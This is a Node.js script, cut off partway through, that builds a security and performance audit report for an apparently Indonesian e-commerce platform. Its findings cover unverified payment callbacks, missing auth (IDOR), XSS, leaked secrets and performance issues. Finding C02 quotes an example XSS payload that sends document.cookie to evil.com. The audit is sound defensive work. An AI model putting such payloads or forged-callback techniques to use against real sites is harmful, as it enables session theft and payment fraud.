// @ts-nocheck
/**
 * Audit Document Generator — FULL DETAIL
 * Generates audit report in 3 formats:
 * - Markdown (.md) — for AI agents + developers
 * - Word (.docx) — for non-technical stakeholders
 * - Excel (.xlsx) — for tracking checklist
 *
 * Usage: node scripts/generate-audit.cjs
 */

const fs = require('fs');
const path = require('path');
const XLSX = require('xlsx');
const { Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell, WidthType, HeadingLevel } = require('docx');

// ═══════════════════════════════════════════════════════════════
// AUDIT DATA — FULL DETAIL
// ═══════════════════════════════════════════════════════════════

const AUDIT_DATA = {
  version: '5.16.2',
  date: '2026-07-21',
  scope: 'Full-stack audit: Frontend, Backend, Database, Security, Performance',
  summary: { critical: 15, major: 23, minor: 20, silent: 10, total: 68 },

  critical: [
    {
      id: 'C01',
      file: 'src/routes/payments.ts:623-637',
      title: 'iPaymu Callback Signature Tidak Diverifikasi',
      description: 'Endpoint `/api/payments/ipaymu/callback` tidak memverifikasi HMAC signature dari request. iPaymu mengirim callback dengan signature di header `X-Signature`, tapi kode hanya memproses body tanpa validasi apakah signature benar. Artinya, siapapun bisa mengirim POST ke endpoint ini dengan body palsu untuk menandai transaksi sebagai "paid" tanpa benar-benar membayar.',
      impact: 'Attacker bisa memalsukan konfirmasi pembayaran. Cukup kirim POST ke `/api/payments/ipaymu/callback` dengan `external_id` yang valid dan status `berhasil`, maka transaksi akan ditandai lunas, stok produk terpotong, dan seller balance terkredit — tanpa uang masuk.',
      ifFixed: 'Callback hanya diterima jika signature valid. Attacker tidak bisa memalsukan pembayaran. Transaksi hanya lunas jika iPaymu benar-benar mengonfirmasi pembayaran.',
      ifNotFixed: 'Setiap transaksi bisa "dibayar" palsu. Attacker bisa beli produk apapun tanpa bayar. Kerugian finansial langsung (produk hilang + uang tidak masuk).',
    },
    {
      id: 'C02',
      file: 'server.ts:327-349',
      title: 'XSS via Product Names di OG Tags',
      description: "Product names dari database di-inject langsung ke HTML meta tags (og:title, og:description) tanpa sanitization. Jika admin memasukkan nama produk seperti <script>document.location='https://evil.com/?c='+document.cookie</script>, script ini akan executing saat link dibagikan di WhatsApp/Telegram/social media.",
      impact: 'Stored XSS — malicious script executes di browser siapapun yang membuka link produk. Cookie session bisa dicuri, akun bisa di-takeover. Kerentanan ini scalable: cukup 1 produk malicious, bisa menyebar ke ribuan user yang membuka link.',
      ifFixed: 'Semua input di-sanitize sebelum di-inject ke HTML. Nama produk tetap tampil normal, tapi script injection tidak mungkin.',
      ifNotFixed: 'XSS tetap aktif. Satu produk malicious bisa mencuri session ribuan user. Reputasi platform rusak permanen.',
    },
    {
      id: 'C03',
      file: 'server.ts:69',
      title: 'dangerouslyAllowBrowser: true di Groq SDK',
      description: 'Inisialisasi Groq SDK menggunakan `dangerouslyAllowBrowser: true`. Flag ini menonaktifkan security checks yang mencegah API key exposure di client-side. Meskipun server-side, flag ini berbahaya karena menunjukkan arsitektur yang tidak aman.',
      impact: 'Jika kode ini refactor ke client-side (atau server-side rendering yang salah), API key Groq akan ter-expose. Groq API key bisa digunakan attacker untuk menjalankan AI requests yang dibayar oleh kita.',
      ifFixed: 'Security checks aktif. API key tetap aman di server-side. Risiko exposure berkurang drastis.',
      ifNotFixed: 'Risiko API key exposure tetap ada. Jika refactor salah, attacker bisa burn quota Groq API kita.',
    },
    {
      id: 'C04',
      file: 'src/routes/payments.ts:62,146,389,468,552',
      title: 'Payment Endpoints Tanpa Auth',
      description: '5 payment endpoints tidak memiliki auth middleware: `POST /payments` (create), `POST /payments/receipt` (verify), `GET /payments/:id` (status), `POST /payments/points` (points pay), `POST /payments/balance` (balance pay). Endpoint ini bisa diakses tanpa login.',
      impact: 'Siapapun bisa: (1) membuat pembayaran untuk user lain, (2) verify receipt palsu, (3) cek status pembayaran user lain, (4) bayar pakai points/balance user lain. Ini adalah IDOR vulnerability yang bisa dieksploitasi massal.',
      ifFixed: 'Hanya user login yang bisa mengakses. Attacker tidak bisa memanipulasi pembayaran user lain.',
      ifNotFixed: 'Semua transaksi bisa dimanipulasi. User A bisa bayar pakai points user B. Kerugian finansial masif.',
    },
    {
      id: 'C05',
      file: 'src/routes/transactions.ts:641-697',
      title: 'Transaction Cancel Tanpa Auth (IDOR)',
      description: 'Endpoint `POST /transactions/:id/cancel` tidak memverifikasi siapa yang membatalkan. Cukup dengan ID transaksi yang diketahui (dari URL/inspeksi), siapapun bisa membatalkan transaksi pending milik user lain.',
      impact: 'Attacker bisa membatalkan transaksi pending yang sedang dalam proses pembayaran. Jika user sudah transfer tapi transaksi dicancel sebelum callback, stok produk bisa hilang sementara uang sudah terkirim.',
      ifFixed: 'Hanya owner transaksi yang bisa cancel. Data integrity terjaga.',
      ifNotFixed: 'IDOR — transaksi bisa dicancel oleh siapapun. Bisa digunakan untuk sabotase pesaing atau fraud.',
    },
    {
      id: 'C06',
      file: 'src/routes/diagnostics.ts:112',
      title: 'Auth Bypass di Diagnostics Route',
      description: 'Route `GET /api/admin/reconciliation/status` tidak menggunakan `requireAuth` dari middleware auth. Route ini seharusnya hanya bisa diakses admin, tapi bisa diakses publik.',
      impact: 'Data sensitif ter-expose: jumlah mismatches, total kerugian, status reconciliation, seller balance discrepancies. Attacker bisa memanfaatkan informasi ini untuk exploit.',
      ifFixed: 'Hanya admin yang bisa melihat data reconciliation. Data sensitif terlindungi.',
      ifNotFixed: 'Data internal ter-expose. Attacker bisa mengetahui kelemahan sistem dan mengeksploitasinya.',
    },
    {
      id: 'C07',
      file: 'src/routes/payments.ts (multiple)',
      title: 'Non-Atomic Payment Flows',
      description: 'Beberapa payment flow memisahkan status update dan stock deduction menjadi operasi terpisah. Jika crash terjadi di antara keduanya, status berubah tapi stock tidak terpotong (atau sebaliknya).',
      impact: 'Data inconsistency: transaksi terlihat "paid" tapi stok tidak berkurang. Seller tidak mendapat uang tapi produk sudah "terjual". Atau sebaliknya: stok terpotong tapi status tetap "pending".',
      ifFixed: 'Operasi digabung dalam satu transaction atomik. Jika ada yang gagal, semua di-rollback. Data konsisten.',
      ifNotFixed: 'Race condition tetap ada. Periodic mismatch terjadi. Perlu manual reconciliation terus-menerus.',
    },
    {
      id: 'C08',
      file: 'src/routes/payments.ts:267',
      title: 'Manual Verify Tidak Memanggil Stock Deduction',
      description: 'Fungsi manual payment verify hanya mengupdate status transaksi menjadi "paid" tanpa memanggil `commitTransactionStock()`. Ini berlaku untuk semua pembayaran manual (transfer bank, QRIS, dll).',
      impact: 'Stock tidak terpotong untuk pembayaran manual. User bisa beli melebihi stok tersedia. Seller tidak mendapat balance karena settlement tidak dijalankan. Dampaknya berlapis: stok akurat rusak + seller rugi.',
      ifFixed: 'Stock terpotong otomatis saat manual verify. Seller balance terkredit. Data konsisten.',
      ifNotFixed: 'Stock tidak akurat untuk semua pembayaran manual. Ini adalah 40% dari semua transaksi. Kerugian akumulatif.',
    },
    {
      id: 'C09',
      file: 'supabase-schema.sql',
      title: 'Schema Drift',
      description: 'File `supabase-schema.sql` tidak sinkron dengan deployed schema di Supabase. Beberapa tabel yang ada di file tidak ada di production, atau sebaliknya.',
      impact: 'Developer baru bisa deploy schema yang salah. Migration yang dijalankan bisa drop tabel yang masih digunakan. Trust pada documentation berkurang.',
      ifFixed: 'Schema file adalah single source of truth. Deploy aman, tidak ada drift.',
      ifNotFixed: 'Drift tetap ada. Setiap deploy berisiko. Developer baru bingung.',
    },
    {
      id: 'C10',
      file: '.env (commit 5b5e51d)',
      title: '.env Ter-commit ke Git History',
      description: 'File `.env` pernah di-commit ke git repository pada commit `5b5e51d`. Meskipun sudah dihapus dari working tree, semua secrets tetap ada di git history.',
      impact: 'Semua production secrets ter-expose: Supabase keys, iPaymu API key, Digiflazz credentials, Gmail app password, VAPID keys. Siapapun yang clone repo bisa mengambil semua credentials ini.',
      ifFixed: 'Semua secrets di-rotate. Git history di-clean atau repo di-recreate. Risiko zero setelah rotation.',
      ifNotFixed: 'Semua credentials aktif bisa digunakan attacker. Backend bisa diakses, database bisa dimanipulasi, API keys bisa disalahgunakan.',
    },
    {
      id: 'C11',
      file: 'src/routes/digital.ts:713-714',
      title: 'Expected HMAC Signature Logged',
      description: 'Debug logging mencetak expected HMAC signature ke console. Log ini bisa diakses oleh attacker yang sudah memiliki akses ke server logs.',
      impact: 'Attacker bisa membaca log untuk mengetahui HMAC signature yang valid, lalu menggunakannya untuk memalsukan webhook.',
      ifFixed: 'Hanya invalid signature yang dilog. Expected value tidak pernah ditulis.',
      ifNotFixed: 'Log poisoning — attacker bisa forge valid webhook dengan membaca log server.',
    },
    {
      id: 'C12',
      file: 'src/routes/admin.ts:52',
      title: 'Weak Temp Password (Math.random)',
      description: 'Fungsi `adminCreateSeller` menggunakan `Math.random()` untuk generate temporary password. `Math.random()` bukan cryptographically secure.',
      impact: 'Password bisa di-predict atau di-brute force. Jika attacker mengetahui seed/pattern, mereka bisa menebak password admin seller.',
      ifFixed: 'Password di-generate dengan `crypto.randomBytes()`. Tidak bisa dipredict.',
      ifNotFixed: 'Password lemah. Risiko akun seller di-brute force.',
    },
    {
      id: 'C13',
      file: 'src/services/payment.js:34-36',
      title: 'Non-Atomic Points Update',
      description: 'Points update menggunakan read-then-write: baca current points, tambah/deduct, tulis ulang. Tidak ada locking atau atomic operation.',
      impact: 'Concurrent requests bisa overwrite points. Jika user beli 2 item secara bersamaan, points hanya terpotong sekali (double spend).',
      ifFixed: 'Gunakan atomic increment dari Supabase. Points selalu akurat, tidak ada double spend.',
      ifNotFixed: 'Double spend points tetap mungkin. User bisa menghabiskan points lebih dari yang dimiliki.',
    },
    {
      id: 'C14',
      file: 'src/pages/portal/PortalPengumuman.tsx:348',
      title: 'XSS via dangerouslySetInnerHTML',
      description: 'Component PortalPengumuman menggunakan `dangerouslySetInnerHTML` untuk render konten announcement tanpa sanitization.',
      impact: 'Stored XSS — jika admin mengisi announcement dengan malicious HTML/JS, semua user portal akan executing script tersebut.',
      ifFixed: 'Gunakan `sanitizeRichTextHtml()` dari DOMPurify. HTML bersih, script injection tidak mungkin.',
      ifNotFixed: 'XSS tetap aktif. Portal bisa digunakan sebagai vector untuk mencuri data user.',
    },
    {
      id: 'C15',
      file: 'src/routes/digital.ts:706-738',
      title: 'Digiflazz Callback Signature Bypass',
      description: 'Endpoint Digiflazz callback tidak memverifikasi signature. Callback diterima tanpa validasi.',
      impact: 'Attacker bisa memalsukan top-up digital items. Cukup kirim POST dengan status "sukses", produk digital akan dikirim tanpa pembayaran.',
      ifFixed: 'Callback hanya diterima dengan signature valid. Digital items hanya dikirim jika pembayaran benar.',
      ifNotFixed: 'Digital items bisa didapatkan gratis. Kerugian langsung dari supplier.',
    },
  ],

  major: [
    {
      id: 'M01',
      file: 'src/pages/kiosk/Checkout.tsx:46,213',
      title: 'Checkout Mutex Tidak di-Reset',
      description: 'Ref `isCreatingTx` di-set `true` saat checkout dimulai, tapi tidak pernah di-reset ke `false` setelah error. Setelah 1 gagal transaksi, user tidak bisa membuat transaksi lagi sampai reload halaman.',
      impact: 'User terkunci dari checkout setelah 1 error. Tidak ada cara untuk recover kecuali reload. Customer service complaint.',
      ifFixed: 'Mutex di-reset di `finally` block. User bisa retry setelah error.',
      ifNotFixed: 'User harus reload setiap kali checkout gagal. Frustrasi, churn risk.',
    },
    {
      id: 'M02',
      file: 'src/store/useCartStore.ts:46-89',
      title: 'Stale Cart Stock',
      description: 'Cart menyimpan stock dari waktu item ditambahkan. Tidak ada re-validation saat checkout. Jika stock berubah (dibeli orang lain) antara waktu ditambahkan dan checkout, user bisa beli melebihi stock.',
      impact: 'Overselling — stok minus. Seller harus reject manual, customer service complaint, refund processing.',
      ifFixed: 'Stock di-revalidate sebelum checkout. Jika tidak cukup, user diberitahu sebelum bayar.',
      ifNotFixed: 'Overselling terjadi secara berkala. Manual intervention diperlukan. Trust berkurang.',
    },
    {
      id: 'M03',
      file: 'src/pages/dashboard/DashboardLayout.tsx:156',
      title: 'Seller Phone Input Kosong',
      description: 'Input phone seller tidak menampilkan nilai yang sudah tersimpan. Setiap kali halaman di-load, input kosong meskipun data sudah ada di database.',
      impact: 'Seller tidak bisa edit/melihat phone mereka. Data kontak tidak lengkap. Komunikasi terhambat.',
      ifFixed: 'Phone ditampilkan dari database. Seller bisa edit dan save.',
      ifNotFixed: 'Phone field selalu kosong. Data kontak tidak lengkap.',
    },
    {
      id: 'M04',
      file: 'src/pages/dashboard/admin/AdminScanner.tsx:168-198',
      title: 'AdminScanner Lock Permanen',
      description: 'Variable `isLocked` di-set `true` saat scan dimulai, tapi tidak di-reset saat error. Scanner menjadi permanently disabled sampai halaman di-reload.',
      impact: 'Admin scanner tidak bisa digunakan setelah 1 error. Admin harus reload untuk recover.',
      ifFixed: 'Lock di-reset di `finally` block. Scanner selalu可用.',
      ifNotFixed: 'Scanner sering mati. Admin harus reload berkali-kali.',
    },
    {
      id: 'M05',
      file: 'src/pages/kiosk/Profile.tsx:53-56',
      title: 'Profile Input Reset',
      description: 'Input fields di profile menggunakan controlled component tanpa local state. Setiap keystroke, value di-overwrite dari state yang belum ter-update.',
      impact: 'User tidak bisa mengetik dengan benar. Input terasa laggy dan reset sendiri.',
      ifFixed: 'Local state untuk input. Responsive typing experience.',
      ifNotFixed: 'Profile editing nyaris tidak bisa digunakan. Frustrasi user.',
    },
    {
      id: 'M06',
      file: 'src/services/email.js:26-31',
      title: 'Email Transport Leak',
      description: 'Setiap kali email dikirim, transport baru di-buat dan tidak di-close. SMTP connection leak terjadi secara kumulatif.',
      impact: 'Gmail rate limiting (500/hari). Connection pool exhaust. Email gagal dikirim setelah volume tinggi.',
      ifFixed: 'Transport di-reuse atau di-close setelah use. Tidak ada leak.',
      ifNotFixed: 'Email service degradasi. User tidak terima receipt/notification.',
    },
    {
      id: 'M07',
      file: 'src/services/background-jobs.js:340',
      title: 'Memory Leak di notifiedProgramStarts',
      description: 'Set `notifiedProgramStarts` bertambah terus tanpa batas. Setiap program registration baru ditambah ke set, tidak pernah di-cleanup.',
      impact: 'Memory consumption meningkat seiring waktu. Setelah ribuan registration, server bisa OOM (Out of Memory).',
      ifFixed: 'Set dibatasi atau menggunakan TTL. Memory stabil.',
      ifNotFixed: 'Memory leak lambat tapi pasti. Server crash dalam waktu lama.',
    },
    {
      id: 'M08',
      file: 'src/services/digiflazz.js:59-65',
      title: 'writeFileSync Blocking Event Loop',
      description: 'Cache Digiflazz ditulis dengan `writeFileSync()`. Operasi sync ini memblokir event loop selama write berlangsung.',
      impact: 'Server freeze sebentar setiap cache update. Semua request lain menunggu. Response time spike.',
      ifFixed: 'Gunakan async write. Event loop tidak terganggu.',
      ifNotFixed: 'Micro-freezes setiap beberapa menit. Bisa menyebabkan timeout pada request lain.',
    },
    {
      id: 'M09',
      file: 'src/routes/auth.ts:199',
      title: 'Weak Password Policy',
      description: 'Tidak ada minimum password length atau complexity requirement. Password 1 karakter diterima.',
      impact: 'User membuat password lemah. Akun mudah di-brute force. Credential stuffing attack.',
      ifFixed: 'Minimum 8 karakter + complexity check. Akun lebih aman.',
      ifNotFixed: 'Akun rentan brute force. Reputasi platform di risiko.',
    },
    {
      id: 'M10',
      file: 'Multiple routes',
      title: 'Verbose Error Messages',
      description: 'Beberapa error handler mengirim error message lengkap ke client, termasuk stack trace atau internal error details.',
      impact: 'Attacker mendapat informasi internal: nama file, line number, database structure. Membantu mereka untuk craft exploit.',
      ifFixed: 'Client hanya mendapat generic error. Internal details hanya di server log.',
      ifNotFixed: 'Information disclosure. Attacker bisa belajar tentang sistem dari error messages.',
    },
    {
      id: 'M11',
      file: 'server.ts',
      title: 'Missing Compression',
      description: 'Tidak ada gzip/brotli compression untuk HTTP responses. Semua response dikirim uncompressed.',
      impact: 'Response 3-5x lebih besar dari necessary. Bandwidth usage tinggi. Load time lebih lambat, terutama di mobile.',
      ifFixed: 'Compression mengurangi response size 70-80%. Load time membaik. Bandwidth saving.',
      ifNotFixed: 'User experience lambat. Hosting cost lebih tinggi. Mobile user terdampak.',
    },
    {
      id: 'M12',
      file: 'src/routes/portal.ts:458',
      title: 'Portal Checkout No Auth',
      description: 'Portal checkout endpoint tidak memverifikasi userId dari token. userId diambil dari request body, bukan dari authenticated session.',
      impact: 'Payment fraud — attacker bisa checkout dengan userId user lain, menghabiskan balance/points mereka.',
      ifFixed: 'userId diambil dari token. Tidak ada spoofing.',
      ifNotFixed: 'IDOR via portal checkout. Balance/points bisa dihabiskan tanpa consent.',
    },
    {
      id: 'M13',
      file: 'Database (multiple tables)',
      title: 'Missing Composite Indexes',
      description: 'Beberapa query menggunakan multiple columns tanpa composite index. Query harus scan seluruh table.',
      impact: 'Query lambat pada data volume tinggi. Background jobs lambat. User experience buruk.',
      ifFixed: 'Composite index mempercepat query 10-100x. Performance improved.',
      ifNotFixed: 'Performance degradasi seiring data bertambah. Semakin lambat.',
    },
    {
      id: 'M14',
      file: 'src/services/background-jobs.js',
      title: 'N+1 Queries di Background Jobs',
      description: 'Background jobs melakukan 50+ DB calls per cycle. Setiap product/seller diproses satu per satu.',
      impact: 'Server load tinggi setiap 5 menit. Response time meningkat. DB connection pool exhaust.',
      ifFixed: 'Batch queries + Promise.all. 50 calls jadi 5. Load berkurang 90%.',
      ifNotFixed: 'Semakin banyak data, semakin berat. Scaling limit tercapai.',
    },
    {
      id: 'M15',
      file: 'src/services/stock.js:392-397',
      title: 'N+1 di Stock Reconciliation',
      description: 'Stock reconciliation query setiap product satu per satu, padahal bisa dilakukan dalam satu query.',
      impact: 'Reconciliation lambat. Memory usage tinggi karena multiple query results.',
      ifFixed: 'Single query + group in memory. 10x lebih cepat.',
      ifNotFixed: 'Reconciliation lambat, resource wasteful.',
    },
    {
      id: 'M16',
      file: 'Multiple endpoints',
      title: 'Missing Caching',
      description: 'Analytics dan reporting endpoints tidak caching. Setiap request query database dari awal.',
      impact: 'Dashboard lambat. User harus menunggu lama untuk melihat data.',
      ifFixed: 'In-memory cache dengan TTL. Response instant untuk data yang sama.',
      ifNotFixed: 'Dashboard selalu lambat. User frustrasi.',
    },
    {
      id: 'M17',
      file: '76 instances',
      title: '.select(*) Overfetching',
      description: '76 tempat menggunakan `.select()` tanpa column specification. Semua kolom diambil, termasuk yang tidak diperlukan.',
      impact: 'Response payload besar. Bandwidth waste. Memory usage tinggi di server dan client.',
      ifFixed: 'Explicit column selection. Payload berkurang 50-80%. Lebih cepat.',
      ifNotFixed: 'Payload tetap besar. Performance penalty.',
    },
    {
      id: 'M18',
      file: 'portal.ts, admin.ts',
      title: 'Unbounded Queries',
      description: 'Beberapa query tidak menggunakan LIMIT. Jika data sangat banyak, query akan mengambil semua sekaligus.',
      impact: 'Memory overflow untuk data besar. Timeout. Server crash.',
      ifFixed: 'Pagination membatasi results per page. Predictable memory usage.',
      ifNotFixed: 'Risiko OOM crash untuk data volume tinggi.',
    },
    {
      id: 'M19',
      file: 'src/routes/misc.ts:576',
      title: 'Missing Auth on /api/reports',
      description: 'Endpoint `/api/reports` yang menampilkan data penjualan tidak memiliki auth middleware.',
      impact: 'Data penjualan ter-expose ke publik. Competitor bisa melihat revenue, product performance.',
      ifFixed: 'Hanya admin/authorized user yang bisa melihat reports.',
      ifNotFixed: 'Business data leak. Competitive disadvantage.',
    },
    {
      id: 'M20',
      file: 'src/routes/withdrawals.ts:27',
      title: 'Seller Balance Restoration Non-Atomic',
      description: 'Saat withdrawal gagal, balance dikembalikan dengan read-then-write. Tidak atomic.',
      impact: 'Race condition — balance bisa di-overwrite jika ada concurrent transaction.',
      ifFixed: 'Fetch current balance dulu, lalu increment. Data konsisten.',
      ifNotFixed: 'Balance bisa salah setelah failed withdrawal.',
    },
    {
      id: 'M21',
      file: '100+ <img> tags',
      title: 'Missing Image Lazy Loading',
      description: 'Lebih dari 100 tag `<img>` tidak menggunakan `loading="lazy"`. Semua gambar di-load sekaligus saat halaman dibuka.',
      impact: 'Initial load time lambat. Bandwidth waste. Mobile user terdampak.',
      ifFixed: 'Lazy loading menunda load gambar yang belum visible. Load time membaik.',
      ifNotFixed: 'Gambar load sekaligus. Lambat di mobile/slow connection.',
    },
    {
      id: 'M22',
      file: 'src/App.tsx:162-175',
      title: 'Auth State Stale',
      description: 'Auth state menggunakan gate `isAuthInit` yang bisa menyebabkan stale data. Setelah login, state bisa masih menunjukkan "belum login" untuk sementara.',
      impact: 'Cross-account data leakage. User bisa melihat data user lain sebelum state ter-update.',
      ifFixed: 'Auth state selalu fresh. Tidak ada stale data.',
      ifNotFixed: 'Race condition pada auth. Data leak sesaat setelah login/logout.',
    },
    {
      id: 'M23',
      file: 'Multiple components',
      title: 'Z-index Conflicts',
      description: 'Tidak ada standardisasi z-index scale. Beberapa component menggunakan inline styles dengan z-index yang konflik.',
      impact: 'Modal bisa tertutup oleh dropdown. Toast notification tertutup oleh sidebar. Visual overlap.',
      ifFixed: 'Standardized z-index scale. Visual hierarchy konsisten.',
      ifNotFixed: 'UI bugs secara berkala. User experience terganggu.',
    },
  ],

  minor: [
    {
      id: 'm01',
      file: 'Multiple components',
      title: 'Missing aria-label',
      description: 'Banyak interactive elements (button, input, link) tidak memiliki aria-label. Screen reader tidak bisa membaca element dengan benar.',
      impact: 'Aksesibilitas buruk. User dengan disabilities tidak bisa menggunakan aplikasi.',
      ifFixed: 'Aksesibilitas improved. Compliance dengan WCAG standards.',
      ifNotFixed: 'Aksesibilitas tetap buruk. Potensi hukum (ADA compliance).',
    },
    {
      id: 'm02',
      file: 'server.ts:102',
      title: 'CSP allows unsafe-inline/eval',
      description: 'Content Security Policy mengizinkan `unsafe-inline` dan `unsafe-eval`. Ini menonaktifkan proteksi XSS dari CSP.',
      impact: 'CSP tidak efektif menangkal XSS. Proteksi berkurang.',
      ifFixed: 'CSP efektif. XSS lebih sulit dieksploitasi.',
      ifNotFixed: 'CSP hanya formalitas. Tidak ada perlindungan nyata.',
    },
    {
      id: 'm03',
      file: 'server.ts:74',
      title: 'trust proxy = 1',
      description: 'Express `trust proxy` di-set ke `1`. Jika deployment berada di belakang proxy yang lebih dari 1 hop, IP address tidak akurat.',
      impact: 'Rate limiting tidak akurat. IP-based blocking tidak efektif.',
      ifFixed: 'Trust proxy sesuai dengan deployment. IP akurat.',
      ifNotFixed: 'Rate limiting bisa di-bypass atau terlalu agresif.',
    },
    {
      id: 'm04',
      file: 'src/middleware/auth.ts:20',
      title: 'getUser DB call setiap request',
      description: 'Setiap HTTP request melakukan 1 DB call untuk verify session. Tidak ada caching.',
      impact: 'DB load meningkat. Latency bertambah 10-50ms per request.',
      ifFixed: 'Session caching mengurangi DB calls 90%+.',
      ifNotFixed: 'DB load linear dengan traffic. Scaling limit lebih cepat tercapai.',
    },
    {
      id: 'm05',
      file: 'src/services/stock.js:48',
      title: 'Silent error catch',
      description: 'Error di stock operations di-catch tanpa logging. Error hilang begitu saja.',
      impact: 'Debugging sulit. Error tidak terdeteksi sampai dampaknya terlihat.',
      ifFixed: 'Error logged. Bisa dideteksi dan diperbaiki lebih cepat.',
      ifNotFixed: 'Error silent. Potensi masalah yang tidak terdeteksi.',
    },
    {
      id: 'm06',
      file: 'src/routes/misc.ts:546',
      title: 'Log injection',
      description: 'User input di-log tanpa sanitization. Newlines atau control characters bisa di-inject.',
      impact: 'Log poisoning. Attacker bisa memalsukan log entries.',
      ifFixed: 'Log aman dari injection. Integrity terjaga.',
      ifNotFixed: 'Log bisa dimanipulasi. Forensic analysis terganggu.',
    },
    {
      id: 'm07',
      file: 'src/services/email.js:82',
      title: 'HTML injection di email',
      description: 'User input di-inject ke email body tanpa HTML escaping.',
      impact: 'Email phishing. Attacker bisa menyisipkan malicious links.',
      ifFixed: 'Email body aman. Tidak ada injection.',
      ifNotFixed: 'Email bisa digunakan untuk phishing.',
    },
    {
      id: 'm08',
      file: 'src/routes/transactions.ts:699-725',
      title: 'IDOR seller data',
      description: 'Seller bisa melihat data transaksi seller lain. Tidak ada ownership check.',
      impact: 'Data leak antar seller. Competitive intelligence.',
      ifFixed: 'Seller hanya bisa melihat data sendiri.',
      ifNotFixed: 'Data leak. Trust berkurang.',
    },
    {
      id: 'm09',
      file: 'server.ts:249-256',
      title: 'VA number logged',
      description: 'Virtual Account number di-log ke console. Jika log diakses attacker, VA bisa digunakan.',
      impact: 'Potential fraud jika VA number disalahgunakan.',
      ifFixed: 'VA number tidak di-log. Aman.',
      ifNotFixed: 'VA number exposed di logs.',
    },
    {
      id: 'm10',
      file: 'src/services/payment.js:32',
      title: 'NaN handling',
      description: 'Tidak ada check apakah amount adalah NaN. Jika input tidak valid, NaN bisa menyebar ke calculations.',
      impact: 'Data corruption. Balance/points jadi NaN. Manual fix diperlukan.',
      ifFixed: 'NaN ditolak sebelum diproses. Data aman.',
      ifNotFixed: 'NaN bisa merusak data. Manual recovery diperlukan.',
    },
    {
      id: 'm11',
      file: 'Multiple',
      title: 'Duplicate routes (trailing slash)',
      description: 'Beberapa endpoint diduplikasi dengan dan tanpa trailing slash. Menghabiskan memory.',
      impact: 'Memory waste. Routing confusion.',
      ifFixed: 'Satu route saja. Clean.',
      ifNotFixed: 'Duplikat tetap ada. Minor waste.',
    },
    {
      id: 'm12',
      file: 'DashboardLayout.tsx:277-420',
      title: 'Nav recreate setiap render',
      description: 'Navigation items array di-recreate setiap render. Tidak di-memoize.',
      impact: 'Unnecessary re-renders. Performance penalty.',
      ifFixed: 'Memoized. Hanya recreate saat data berubah.',
      ifNotFixed: 'Minor performance hit setiap render.',
    },
    {
      id: 'm13',
      file: 'DashboardLayout.tsx:145',
      title: 'Hardcoded SARIROTI_EMAILS',
      description: 'Daftar email Sariroti di-hardcode di component. Sulit diupdate.',
      impact: 'Update email list requires code change + deploy.',
      ifFixed: 'Pindah ke database atau environment variable.',
      ifNotFixed: 'Maintenance overhead.',
    },
    {
      id: 'm14',
      file: 'src/routes/admin.ts:6-15',
      title: 'Redundant auth check',
      description: 'Admin routes melakukan auth check dua kali: global middleware + local check.',
      impact: 'Code duplication. Confusing.',
      ifFixed: 'Konsolidasi ke satu global check.',
      ifNotFixed: 'Redundancy tetap ada. Maintenance confusion.',
    },
    {
      id: 'm15',
      file: 'src/routes/diagnostics.ts:67-109',
      title: 'Debug routes leak data',
      description: 'Debug routes (system state, auth test) bisa diakses publik di production.',
      impact: 'Internal information exposure.',
      ifFixed: 'Debug routes disabled di production.',
      ifNotFixed: 'Data internal ter-expose.',
    },
    {
      id: 'm16',
      file: 'background-jobs.js:26',
      title: 'dailyReport 60s interval',
      description: 'Daily report job berjalan setiap 60 detik, bukan setiap hari.',
      impact: 'Resource waste. Report dikirim terlalu sering.',
      ifFixed: 'Schedule sesuai kebutuhan. Resource efficient.',
      ifNotFixed: 'Wasted compute. Email flooding.',
    },
    {
      id: 'm17',
      file: 'App.tsx:120-130',
      title: 'Reload loop risk',
      description: 'Jika chunk load gagal, app reload tanpa batas. Infinite loop possible.',
      impact: 'Browser hang. User harus force close.',
      ifFixed: 'Max retry limit. Graceful degradation.',
      ifNotFixed: 'Infinite reload risk.',
    },
    {
      id: 'm18',
      file: 'server.ts:276-278',
      title: 'Interval pileup risk',
      description: 'Jika background job interval tidak di-clear, multiple intervals bisa berjalan bersamaan.',
      impact: 'Resource leak. Duplicate jobs.',
      ifFixed: 'Guard untuk prevent pileup.',
      ifNotFixed: 'Multiple intervals running simultaneously.',
    },
    {
      id: 'm19',
      file: 'Multiple',
      title: 'Missing Suspense boundaries',
      description: 'Beberapa lazy-loaded routes tidak memiliki Suspense fallback.',
      impact: 'White screen saat loading. UX buruk.',
      ifFixed: 'Loading indicator ditampilkan saat route load.',
      ifNotFixed: 'Flash of white screen.',
    },
    {
      id: 'm20',
      file: 'src/routes/portal.ts:16',
      title: 'Missing points_history index',
      description: 'Tidak ada index untuk `points_history` query yang sering digunakan.',
      impact: 'Query lambat untuk points history.',
      ifFixed: 'Index mempercepat query.',
      ifNotFixed: 'Points history page lambat.',
    },
  ],

  silent: [
    {
      id: 's01',
      file: 'KioskLayout.tsx:64-77',
      title: 'Error swallowed tanpa feedback',
      description: 'Fetch error di KioskLayout di-catch tanpa menampilkan error message ke user. User tidak tahu apa yang terjadi.',
      impact: 'User melihat halaman kosong atau data tidak lengkap tanpa penjelasan. Mereka mungkin mengira aplikasi rusak.',
      ifFixed: 'Error message ditampilkan. User tahu ada masalah dan bisa retry.',
      ifNotFixed: 'User bingung. Churn risk.',
    },
    {
      id: 's02',
      file: 'AdminDashboard.tsx:183-184',
      title: 'Promise.all catch = null',
      description: 'Promise.all untuk dashboard data di-catch dengan handler kosong. Jika ada error, dashboard kosong tanpa penjelasan.',
      impact: 'Admin melihat dashboard kosong. Mereka tidak tahu apakah memang tidak ada data atau ada error.',
      ifFixed: 'Error ditampilkan. Admin tahu ada masalah.',
      ifNotFixed: 'Dashboard ambigu. Admin bisa membuat keputusan salah.',
    },
    {
      id: 's03',
      file: 'PortalFormView.tsx:212-215',
      title: 'Registration check gagal silent',
      description: 'Pengecekan apakah user sudah terdaftar untuk program gagal tanpa feedback. User bisa mendaftar duplikat.',
      impact: 'Double registration. Double points deduction. Admin harus reject manual.',
      ifFixed: 'Error ditampilkan. User tahu ada masalah dan tidak bisa proceed.',
      ifNotFixed: 'Duplikat registration. Data inconsistency.',
    },
    {
      id: 's04',
      file: 'useCartStore.ts:71-78',
      title: 'updateQuantity(0) tidak remove',
      description: 'Jika quantity diupdate ke 0, item tidak dihapus dari cart. Zombie items tetap ada.',
      impact: 'Cart count salah. User bisa checkout dengan item yang seharusnya tidak ada.',
      ifFixed: 'Quantity 0 = remove. Cart selalu akurat.',
      ifNotFixed: 'Zombie items. Cart inaccurate.',
    },
    {
      id: 's05',
      file: 'History.tsx:67-82',
      title: 'Polling timeout setelah unmount',
